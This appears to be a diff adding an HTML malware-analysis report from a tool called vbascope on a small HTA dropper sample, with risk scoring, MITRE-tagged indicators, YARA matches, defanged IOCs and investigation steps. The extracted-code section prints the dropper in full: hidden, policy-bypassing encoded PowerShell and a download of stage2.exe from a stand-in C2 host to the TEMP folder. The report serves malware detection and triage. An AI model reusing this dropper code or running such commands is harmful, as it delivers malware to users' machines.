@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>vbascope report - dropper.hta</title>
+<style>
+:root { color-scheme: light dark; }
+* { box-sizing: border-box; }
+body { font-family: -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+  margin: 0; background: #f4f5f7; color: #1a1a1a; line-height: 1.5; }
+.wrap { max-width: 1000px; margin: 0 auto; padding: 24px 16px 64px; }
+header.top { display: flex; flex-wrap: wrap; align-items: center; gap: 16px;
+  background: #fff; border-radius: 12px; padding: 20px 24px; box-shadow: 0 1px 4px rgba(0,0,0,.08); }
+h1 { font-size: 20px; margin: 0; }
+h2 { font-size: 16px; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 0; }
+h4 { margin: 14px 0 4px; font-size: 13px; text-transform: uppercase; letter-spacing: .04em; color: #555; }
+.risk { margin-left: auto; text-align: center; min-width: 150px; }
+.score { font-size: 40px; font-weight: 800; line-height: 1; color: #c62828; }
+.badge { display: inline-block; padding: 4px 14px; border-radius: 999px; color: #fff;
+  font-weight: 700; font-size: 13px; background: #c62828; margin-top: 6px; }
+.bar { height: 10px; border-radius: 6px; background: #e0e0e0; overflow: hidden; margin-top: 10px; }
+.bar > span { display: block; height: 100%; width: 100%; background: #c62828; }
+.card { background: #fff; border-radius: 12px; padding: 18px 22px; margin-top: 18px;
+  box-shadow: 0 1px 4px rgba(0,0,0,.06); }
+.exec ul { margin: 8px 0 0; padding-left: 20px; }
+.exec li { margin: 2px 0; }
+table { border-collapse: collapse; width: 100%; font-size: 13px; }
+.kv td { padding: 4px 8px; border-bottom: 1px solid #eee; vertical-align: top; }
+.kv td.k { color: #666; width: 170px; font-weight: 600; }
+.findings th, .findings td { text-align: left; padding: 7px 8px; border-bottom: 1px solid #eee; vertical-align: top; }
+.findings th { background: #fafafa; font-size: 12px; text-transform: uppercase; letter-spacing: .03em; color: #555; }
+.num { text-align: right; font-variant-numeric: tabular-nums; }
+.pill { display: inline-block; padding: 2px 9px; border-radius: 999px; color: #fff; font-size: 11px; font-weight: 700; }
+.desc { color: #333; font-size: 12.5px; }
+.ex { color: #888; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 11px; margin-top: 3px; white-space: pre-wrap; word-break: break-all; }
+code { font-family: ui-monospace, Menlo, Consolas, monospace; background: #f0f0f0; padding: 1px 5px; border-radius: 4px; font-size: 12px; }
+.muted { color: #999; font-style: italic; }
+details.sec { background: #fff; border-radius: 12px; margin-top: 14px; box-shadow: 0 1px 4px rgba(0,0,0,.06); overflow: hidden; }
+details.sec > summary { cursor: pointer; padding: 14px 22px; font-weight: 700; font-size: 15px; list-style: none; }
+details.sec > summary::-webkit-details-marker { display: none; }
+details.sec > summary::before { content: '▸ '; color: #999; }
+details.sec[open] > summary::before { content: '▾ '; }
+.secbody { padding: 0 22px 18px; }
+details.mod { border: 1px solid #eee; border-radius: 8px; margin: 8px 0; }
+details.mod > summary { cursor: pointer; padding: 8px 12px; font-weight: 600; }
+pre.code { background: #1e1e2e; color: #e0e0e0; padding: 14px; border-radius: 8px; overflow-x: auto;
+  font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12.5px; line-height: 1.5; margin: 0; }
+pre.code .k { color: #82aaff; }
+pre.code .s { color: #c3e88d; }
+pre.code .c { color: #697098; font-style: italic; }
+ul.ioc { margin: 4px 0; padding-left: 18px; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12px; word-break: break-all; }
+ul.flags li { margin: 3px 0; }
+.copybox { width: 100%; font-family: ui-monospace, Menlo, Consolas, monospace; font-size: 12px;
+  border: 1px solid #ddd; border-radius: 8px; padding: 10px; background: #fafafa; }
+footer { margin-top: 30px; color: #999; font-size: 12px; text-align: center; }
+@media (prefers-color-scheme: dark) {
+  body { background: #15161a; color: #e6e6e6; }
+  header.top, .card, details.sec { background: #1f2127; box-shadow: none; border: 1px solid #2c2f36; }
+  h2 { border-color: #2c2f36; }
+  .kv td.k { color: #9aa; }
+  .findings th { background: #24262c; color: #aab; }
+  .kv td, .findings td { border-color: #2c2f36; }
+  code { background: #2a2d34; }
+  .copybox { background: #24262c; border-color: #2c2f36; color: #ddd; }
+}
+</style></head>
+<body><div class="wrap">
+<header class="top">
+  <div>
+    <h1>dropper.hta</h1>
+    <div class="muted">HTML Application &middot; 494 bytes</div>
+    <div class="muted" style="font-family:ui-monospace,monospace;font-size:11px">SHA256 a6b23d1ac0483f8f186d49e2767f8ae127b3374309f82a33032ccb51f291cb09</div>
+  </div>
+  <div class="risk">
+    <div class="score">100</div>
+    <div class="muted" style="font-size:11px">/ 100</div>
+    <div class="badge">CRITICAL</div>
+    <div class="bar"><span></span></div>
+  </div>
+</header>
+
+<div class="card exec">
+  <h2>Executive summary</h2>
+  <ul><li>1 VBA module(s) extracted</li><li>8 YARA match(es)</li><li>2 IOC(s)</li></ul>
+  <table class='kv'><thead><tr><th>Reason</th><th>Points</th></tr></thead><tbody><tr><td>Execution capability: WScript.Shell</td><td class='num'>+15</td></tr><tr><td>Execution capability: PowerShell invocation</td><td class='num'>+15</td></tr><tr><td>Execution capability: PowerShell stealth flags</td><td class='num'>+15</td></tr><tr><td>Execution capability: IEX / Invoke-Expression</td><td class='num'>+15</td></tr><tr><td>Download capability: XMLHTTP / ServerXMLHTTP</td><td class='num'>+15</td></tr><tr><td>Download capability: ADODB.Stream write</td><td class='num'>+15</td></tr><tr><td>Client capability: Embedded &lt;script&gt; / DOM inject</td><td class='num'>+10</td></tr><tr><td>Filesystem capability: FileSystemObject write</td><td class='num'>+5</td></tr><tr><td>Obfuscation indicators (sub-score 10)</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_PowerShell_DownloadCradle</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_PowerShell_StealthFlags</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_VBA_Shell_Execution</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_Download_To_Disk</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_PowerShell_DownloadCradle</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_PowerShell_StealthFlags</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_VBA_Shell_Execution</td><td class='num'>+10</td></tr><tr><td>YARA: Maldoc_Download_To_Disk</td><td class='num'>+10</td></tr></tbody></table>
+</div>
+
+<div class="card">
+  <h2>File identification</h2>
+  <table class='kv'><tr><td class='k'>File</td><td>dropper.hta</td></tr><tr><td class='k'>Type</td><td>HTML Application</td></tr><tr><td class='k'>MIME (libmagic)</td><td>text/html</td></tr><tr><td class='k'>libmagic</td><td>HTML document, ASCII text</td></tr><tr><td class='k'>Size</td><td>494 bytes</td></tr><tr><td class='k'>Magic bytes</td><td>3c68746d6c3e3c68</td></tr><tr><td class='k'>MD5</td><td>9ddf8eb39e88ed54f1957b79b9f7a5dc</td></tr><tr><td class='k'>SHA1</td><td>94137840dc8e6265ab9ef19fb129bdf2cbc027ca</td></tr><tr><td class='k'>SHA256</td><td>a6b23d1ac0483f8f186d49e2767f8ae127b3374309f82a33032ccb51f291cb09</td></tr></table>
+</div>
+
+<details class='sec' open><summary>Suspicious indicators</summary><div class='secbody'><table class='findings'><thead><tr><th>Severity</th><th>Indicator</th><th>Category</th><th>Count</th><th>MITRE</th><th>Why it matters</th></tr></thead><tbody><tr><td><span class='pill' style='background:#c62828'>CRITICAL</span></td><td>PowerShell stealth flags</td><td>execution</td><td class='num'>8</td><td><code>T1059.001/T1564</code></td><td class='desc'>Encoded/hidden PowerShell: -enc, -nop, -w hidden, -ep bypass.<div class='ex'>w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB<br>d = &quot;powershell.exe -nop -w hidden -ep bypas<br>powershell.exe -nop -w hidden -ep bypass -enc SQB</div></td></tr><tr><td><span class='pill' style='background:#c62828'>CRITICAL</span></td><td>PowerShell invocation</td><td>execution</td><td class='num'>2</td><td><code>T1059.001</code></td><td class='desc'>Spawns PowerShell - the dominant fileless execution vector.<div class='ex'>pt.Shell&quot;)   cmd = &quot;powershell.exe -nop -w hidden -ep</div></td></tr><tr><td><span class='pill' style='background:#c62828'>CRITICAL</span></td><td>IEX / Invoke-Expression</td><td>execution</td><td class='num'>2</td><td><code>T1059.001</code></td><td class='desc'>Dynamic PowerShell execution of a downloaded/decoded string.<div class='ex'>decoded layer ===== IEX (New-Object IEX (Ne<br>=== IEX (New-Object IEX (New-Object</div></td></tr><tr><td><span class='pill' style='background:#ef6c00'>HIGH</span></td><td>WScript.Shell</td><td>execution</td><td class='num'>6</td><td><code>T1059.001/T1059.005</code></td><td class='desc'>Instantiates the Windows Script Host shell to run commands.<div class='ex'>sh = CreateObject(&quot;WScript.Shell&quot;)   cmd = &quot;powershe<br>w_OnLoad   Set sh = CreateObject(&quot;WScript.Shell&quot;)   cmd = &quot;powershe</div></td></tr><tr><td><span class='pill' style='background:#ef6c00'>HIGH</span></td><td>XMLHTTP / ServerXMLHTTP</td><td>download</td><td class='num'>4</td><td><code>T1105</code></td><td class='desc'>MSXML HTTP objects fetch remote content (payload or C2).<div class='ex'>t x = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;)   x.Open &quot;GET&quot;, &quot;<br>reateObject(&quot;MSXML2.ServerXMLHTTP&quot;)   x.Open &quot;GET&quot;, &quot;</div></td></tr><tr><td><span class='pill' style='background:#ef6c00'>HIGH</span></td><td>ADODB.Stream write</td><td>download</td><td class='num'>2</td><td><code>T1105</code></td><td class='desc'>ADODB.Stream commonly pairs with a download to write bytes to disk.<div class='ex'>eam = CreateObject(&quot;ADODB.Stream&quot;)   stream.SaveToFi</div></td></tr><tr><td><span class='pill' style='background:#ef6c00'>HIGH</span></td><td>Embedded &lt;script&gt; / DOM inject</td><td>client</td><td class='num'>2</td><td><code>T1027.006/T1204.001</code></td><td class='desc'>Inline &lt;script&gt;, runtime script injection (createElementNS) or SVG &lt;foreignObject&gt; - markup-based code (SVG smuggling, HTA, HTML).<div class='ex'>&lt;html&gt;&lt;head&gt;&lt;script language=&quot;VBScript&quot;<br>&lt;/html&gt; &lt;html&gt;&lt;head&gt;&lt;script language=&quot;VBScript&quot;</div></td></tr><tr><td><span class='pill' style='background:#f9a825'>MEDIUM</span></td><td>FileSystemObject write</td><td>filesystem</td><td class='num'>2</td><td><code>T1105</code></td><td class='desc'>Scripting.FileSystemObject CreateTextFile/Write drops a file.<div class='ex'>B.Stream&quot;)   stream.SaveToFile Environ(&quot;TEMP&quot;) &amp; &quot;</div></td></tr><tr><td><span class='pill' style='background:#0097a7'>LOW</span></td><td>Environ()</td><td>obfuscation</td><td class='num'>2</td><td><code>T1027</code></td><td class='desc'>Environ() resolves %TEMP%/%APPDATA% drop paths at runtime.<div class='ex'>stream.SaveToFile Environ(&quot;TEMP&quot;) &amp; &quot;\a.exe&quot; E</div></td></tr></tbody></table></div></details>
+<details class='sec' open><summary>Modern-format artefacts (OneNote / PDF / LNK / XLL)</summary><div class='secbody'><p class='muted'>No modern-format artefacts.</p></div></details>
+<details class='sec'><summary>Obfuscation analysis</summary><div class='secbody'><ul class='flags'><li>2 base64-like blob(s).</li></ul></div></details>
+<details class='sec'><summary>Extracted VBA</summary><div class='secbody'><details class='mod'><summary>dropper.hta <span class='muted'>[HTA] 494B</span></summary><pre class='code'>&lt;html&gt;&lt;head&gt;&lt;script language=<span class='s'>&quot;VBScript&quot;</span>&gt;
+<span class='k'>Sub</span> Window_OnLoad
+  <span class='k'>Set</span> sh = <span class='k'>CreateObject</span>(<span class='s'>&quot;WScript.<span class='k'>Shell</span>&quot;</span>)
+  cmd = <span class='s'>&quot;powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA&quot;</span>
+  sh.Run cmd, 0, False
+<span class='c'>  &#x27; download cradle</span>
+  <span class='k'>Set</span> x = <span class='k'>CreateObject</span>(<span class='s'>&quot;MSXML2.ServerXMLHTTP&quot;</span>)
+  x.Open <span class='s'>&quot;GET&quot;</span>, <span class='s'>&quot;http://evil-c2.example.com/stage2.exe&quot;</span>, False
+  x.Send
+  <span class='k'>Set</span> stream = <span class='k'>CreateObject</span>(<span class='s'>&quot;ADODB.Stream&quot;</span>)
+  stream.SaveToFile <span class='k'>Environ</span>(<span class='s'>&quot;TEMP&quot;</span>) &amp; <span class='s'>&quot;\a.exe&quot;</span>
+<span class='k'>End</span> <span class='k'>Sub</span>
+&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</pre></details></div></details>
+<details class='sec'><summary>Excel 4.0 (XLM) macros</summary><div class='secbody'><p class='muted'>No Excel 4.0 macros.</p></div></details>
+<details class='sec'><summary>RTF embedded objects</summary><div class='secbody'><p class='muted'>No embedded RTF objects.</p></div></details>
+<details class='sec'><summary>YARA matches</summary><div class='secbody'><table class='findings'><thead><tr><th>Rule</th><th>Source</th><th>Description</th><th>Matched strings</th></tr></thead><tbody><tr><td>Maldoc_PowerShell_DownloadCradle</td><td>file</td><td>PowerShell download cradle (fileless payload fetch + run)</td><td class='desc'><code>$ps</code> @ 109: powershell<br><code>$enc</code> @ 150: -enc<br><code>$hidden</code> @ 132: hidden</td></tr><tr><td>Maldoc_PowerShell_StealthFlags</td><td>file</td><td>PowerShell launched with stealth/evasion flags</td><td class='desc'><code>$f1</code> @ 124: -nop<br><code>$f3</code> @ 129: -w hidden<br><code>$f5</code> @ 139: -ep bypass</td></tr><tr><td>Maldoc_VBA_Shell_Execution</td><td>file</td><td>VBA process execution primitives</td><td class='desc'><code>$s1</code> @ 84: WScript.Shell</td></tr><tr><td>Maldoc_Download_To_Disk</td><td>file</td><td>Download-to-disk dropper (URLDownloadToFile / XMLHTTP + ADODB.Stream)</td><td class='desc'><code>$d3</code> @ 264: MSXML2.ServerXMLHTTP<br><code>$stream</code> @ 388: ADODB.Stream<br><code>$save</code> @ 412: SaveToFile</td></tr><tr><td>Maldoc_PowerShell_DownloadCradle</td><td>vba</td><td>PowerShell download cradle (fileless payload fetch + run)</td><td class='desc'><code>$ps</code> @ 109: powershell<br><code>$enc</code> @ 150: -enc<br><code>$hidden</code> @ 132: hidden</td></tr><tr><td>Maldoc_PowerShell_StealthFlags</td><td>vba</td><td>PowerShell launched with stealth/evasion flags</td><td class='desc'><code>$f1</code> @ 124: -nop<br><code>$f3</code> @ 129: -w hidden<br><code>$f5</code> @ 139: -ep bypass</td></tr><tr><td>Maldoc_VBA_Shell_Execution</td><td>vba</td><td>VBA process execution primitives</td><td class='desc'><code>$s1</code> @ 84: WScript.Shell</td></tr><tr><td>Maldoc_Download_To_Disk</td><td>vba</td><td>Download-to-disk dropper (URLDownloadToFile / XMLHTTP + ADODB.Stream)</td><td class='desc'><code>$d3</code> @ 264: MSXML2.ServerXMLHTTP<br><code>$stream</code> @ 388: ADODB.Stream<br><code>$save</code> @ 412: SaveToFile</td></tr></tbody></table></div></details>
+<details class='sec'><summary>Document metadata</summary><div class='secbody'><p class='muted'>No metadata.</p></div></details>
+<details class='sec' open><summary>Indicators of Compromise (defanged)</summary><div class='secbody'><h4>URLs (1)</h4><ul class='ioc'><li>hxxp://evil-c2[.]example[.]com/stage2[.]exe</li></ul><h4>Domains (1)</h4><ul class='ioc'><li>evil-c2[.]example[.]com</li></ul><h4>Copy-friendly (defanged)</h4><textarea class='copybox' readonly rows='3'>hxxp://evil-c2[.]example[.]com/stage2[.]exe
+evil-c2[.]example[.]com</textarea></div></details>
+
+<div class="card">
+  <h2>What to investigate next</h2>
+  <ul><li>Pivot the extracted URLs/domains in VirusTotal, URLhaus and your passive DNS. Pull the staged payload in an isolated VM, not on a host.</li><li>Decode the PowerShell: base64 -d the -enc blob, then deobfuscate the download cradle to recover the second-stage URL.</li><li>Cross-reference the SHA256 against MalwareBazaar / your internal corpus before writing it up - you may already have the family and C2.</li></ul>
+</div>
+
+<footer>Generated by vbascope &middot; 2026-11-10T23:35:30.286122+00:00 &middot; static analysis only, sample was never executed</footer>
+</div></body></html>
